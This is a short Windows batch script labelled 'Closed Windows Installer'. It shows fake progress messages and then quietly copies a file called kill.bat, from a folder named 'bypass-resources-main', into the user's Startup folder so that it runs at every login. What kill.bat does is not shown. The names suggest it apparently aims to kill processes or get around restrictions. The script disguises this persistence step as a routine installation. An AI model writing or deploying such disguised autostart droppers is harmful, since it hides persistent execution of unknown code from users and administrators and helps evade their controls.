@echo off
color 02
echo Welcome to Closed Windows Installer!(v0.0.1)
echo Press any key to start the installation
pause > nul
echo Starting installation...
timeout /t 2 /NOBREAK > nul
echo Loading workers...
timeout /t 1 /NOBREAK > nul
echo Copying...
timeout /T 3 /NOBREAK > nul
COPY "C:\Users\%USERNAME%\Downloads\bypass-resources-main\bypass-resources-main\kill.bat" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo Copied!
echo Running file...
timeout /t 1 /NOBREAK > nul
echo Installation completed successfully!
timeout /t 1 /NOBREAK > nul
echo Press any key to exit
pause > nul
